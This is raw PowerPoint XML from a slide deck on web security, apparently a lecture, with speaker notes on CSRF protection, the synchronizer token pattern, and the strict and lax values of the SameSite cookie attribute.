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3.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4.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+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5.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+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theme/theme6.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+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8" r:id="rId1"/>
    <p:sldMasterId id="2147483696" r:id="rId2"/>
    <p:sldMasterId id="2147483702" r:id="rId3"/>
    <p:sldMasterId id="2147483708" r:id="rId4"/>
    <p:sldMasterId id="2147483714" r:id="rId5"/>
    <p:sldMasterId id="2147483720" r:id="rId6"/>
    <p:sldMasterId id="2147483726" r:id="rId7"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId59"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId8"/>
    <p:sldId id="282" r:id="rId9"/>
    <p:sldId id="257" r:id="rId10"/>
    <p:sldId id="258" r:id="rId11"/>
    <p:sldId id="306" r:id="rId12"/>
    <p:sldId id="259" r:id="rId13"/>
    <p:sldId id="260" r:id="rId14"/>
    <p:sldId id="261" r:id="rId15"/>
    <p:sldId id="262" r:id="rId16"/>
    <p:sldId id="263" r:id="rId17"/>
    <p:sldId id="305" r:id="rId18"/>
    <p:sldId id="264" r:id="rId19"/>
    <p:sldId id="265" r:id="rId20"/>
    <p:sldId id="267"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66" r:id="rId34"/>
    <p:sldId id="281" r:id="rId35"/>
    <p:sldId id="303" r:id="rId36"/>
    <p:sldId id="283" r:id="rId37"/>
    <p:sldId id="284" r:id="rId38"/>
    <p:sldId id="285" r:id="rId39"/>
    <p:sldId id="286" r:id="rId40"/>
    <p:sldId id="287" r:id="rId41"/>
    <p:sldId id="288" r:id="rId42"/>
    <p:sldId id="289" r:id="rId43"/>
    <p:sldId id="290" r:id="rId44"/>
    <p:sldId id="291" r:id="rId45"/>
    <p:sldId id="292" r:id="rId46"/>
    <p:sldId id="293" r:id="rId47"/>
    <p:sldId id="304" r:id="rId48"/>
    <p:sldId id="294" r:id="rId49"/>
    <p:sldId id="295" r:id="rId50"/>
    <p:sldId id="296" r:id="rId51"/>
    <p:sldId id="298" r:id="rId52"/>
    <p:sldId id="299" r:id="rId53"/>
    <p:sldId id="307" r:id="rId54"/>
    <p:sldId id="308" r:id="rId55"/>
    <p:sldId id="309" r:id="rId56"/>
    <p:sldId id="300" r:id="rId57"/>
    <p:sldId id="301" r:id="rId5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9" d="100"/>
          <a:sy n="79" d="100"/>
        </p:scale>
        <p:origin x="806" y="4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slide" Target="slides/slide32.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slide" Target="slides/slide35.xml"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide40.xml"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide43.xml"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide48.xml"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.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9.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide22.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slide" Target="slides/slide38.xml"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide46.xml"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide51.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster5.xml"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1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slide" Target="slides/slide36.xml"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide41.xml"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide49.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide44.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster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slide" Target="slides/slide39.xml"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="notesMasters/notesMaster1.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide13.xml"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide34.xml"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide47.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slide" Target="slides/slide42.xml"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide50.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide3.xml"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide24.xml"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide37.xml"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide45.xml"/><Relationship Id="rId60"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BF12B92-C48D-467E-8B62-354397C46F36}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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F70589B-B399-4D23-8DBC-517C918E0E2D}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38151866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www.owasp.org/index.php/SameSite" TargetMode="External"/><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601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t>https://medium.com/@charithra/introduction-to-csrf-a329badfca49</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8602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550139F8-331A-4527-8D9F-5D5227C4515E}" type="slidenum">
              <a:rPr lang="en-GB" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>38</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14831821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806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https://medium.com/@charithra/introduction-to-csrf-a329badfca49</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8806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15F28D13-8D8A-4D6E-B48D-B1DB08304E32}" type="slidenum">
              <a:rPr lang="en-GB" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>39</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41992750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830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Ref:  https://faun.pub/cross-site-request-forgery-protection-using-synchronizer-token-pattern-72b246ded56c</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9830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DD49C7AD-2A8E-4A2C-BD7A-28EA62B6180E}" type="slidenum">
              <a:rPr lang="en-GB" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>45</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10380681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035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0035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F0998726-5973-4DF2-8840-3380611FA414}" type="slidenum">
              <a:rPr lang="en-GB" altLang="en-US" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>46</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" altLang="en-US">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30760763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957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t>SameSite prevents the browser from sending this cookie along with cross-site requests. The main goal is mitigate the risk of cross-origin information leakage. It also provides some protection against cross-site request forgery attacks. Possible values for the flag are lax or strict.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>The strict value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link. For example, for a GitHub-like website this would mean that if a logged-in user follows a link to a private GitHub project posted on a corporate discussion forum or email, GitHub will </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1"/>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> receive the session cookie and the user will not be able to access the project.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>A bank website however most likely doesn't want to allow any transactional pages to be linked from external sites so the strict flag would be most appropriate here.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>The default lax value provides a reasonable balance between security and usability for websites that want to maintain user's logged-in session after the user arrives from an external link. In the above GitHub scenario, the session cookie would be allowed when following a regular link from an external website while blocking it in CSRF-prone request methods (e.g. POST).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>As of November 2017 the SameSite attribute is implemented in Chrome, Firefox, and Opera. Since version 12.1 Safari also supports this. Windows 7 with IE 11 lacks support as of December 2018, see caniuse.com below.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-GB" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.owasp.org/index.php/SameSite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10957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54E127E-5E11-4B36-92D7-F80ADB0A59BB}" type="slidenum">
              <a:rPr lang="en-GB" altLang="en-US" smtClean="0"/>
              <a:pPr>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
              </a:pPr>
              <a:t>50</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="253153635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5.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4.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6.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4.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64377600-6D34-4A56-A7F4-46BCC717BCF8}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9875218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6CB82CC-E220-4E02-8EA7-15C15F64F711}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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6E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35051823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F20EE7C-5184-4727-8684-5CEE859EEC5E}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27721818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339FFB5-C996-47F3-9736-AD8B036EF1C9}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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6E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6659535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9FB137C-916D-4FE1-84DF-3B97140B7876}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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6E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9991159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5FA8DED-3362-4779-B568-5CBEACB3C7B7}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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6E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18554193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808A7CA-DE40-46A2-AECB-5EF3C8843E09}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42710450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81CC4DF-FDE6-493C-9D94-6C896686442C}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20367493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DFE7DE8-4E5C-4B5B-8074-5DCD6964F8D5}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35244185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8904754-CA8E-4B60-B772-BB6CCDA48C81}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33562065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CA557FA0-67F9-4D54-B3E9-32DA88CB983A}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="344913260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37501E47-0826-46C6-8D0F-F4B15BF87B49}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="136941022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D5FBE1C-DA53-4079-AC2D-D1EF17E7A34A}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="388370758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1066FB50-87AB-419E-ACFF-C6CAB1BDD918}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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6E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="89662616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F30AA67D-CE6F-41F6-93F2-0EEFE9658DE1}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="561111" y="6391838"/>
            <a:ext cx="3644282" cy="304801"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="296310379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B347025E-706F-43F2-8690-E31FA3EBB180}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23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6E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="252725357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481D9D9F-8EE9-4CAD-A556-EA62C2DEAFAE}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="114043689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276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3840480"/>
            <a:ext cx="8534400" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3571B8D1-1194-4C75-8E0F-97E3F6CC0214}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
